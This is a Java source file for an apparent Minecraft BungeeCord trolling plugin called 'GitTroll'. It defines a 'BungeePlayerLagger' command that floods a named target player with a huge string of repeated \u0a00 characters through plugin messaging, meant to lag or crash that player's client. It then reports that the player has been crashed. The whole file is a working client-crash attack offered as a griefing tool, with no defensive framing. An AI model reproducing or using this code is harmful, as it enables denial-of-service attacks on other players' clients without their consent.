package net.Lenni0451.GitTroll.command.commands.bungeecord;

import java.util.List;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.BungeeUtils;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class BungeePlayerLagger extends CommandBase {

	public BungeePlayerLagger() {
		super("BungeePlayerLagger", "Let the client of a player lag anywhere on the bungee", "<Player>");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLength(1)) {
			BungeeUtils bu = new BungeeUtils(executor.getPlayer());
			String text = "";
            for (int i = 0; i < 2000; i++) {
                text += "\u0a00\u0a00\u0a00\u0a00";
            }
            for (int i = 0; i < 12; i++) {
                text += "\u0a00\u0a00";
				bu.sendBungeeMessageToPlayer("Message", args.getString(0), text);
            }
			
			executor.sendGitMessage("The player has been crashed.");
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {
		if(args.isEmpty()) {
			this.tabCompletePlayers(tabComplete);
		}
	}

}
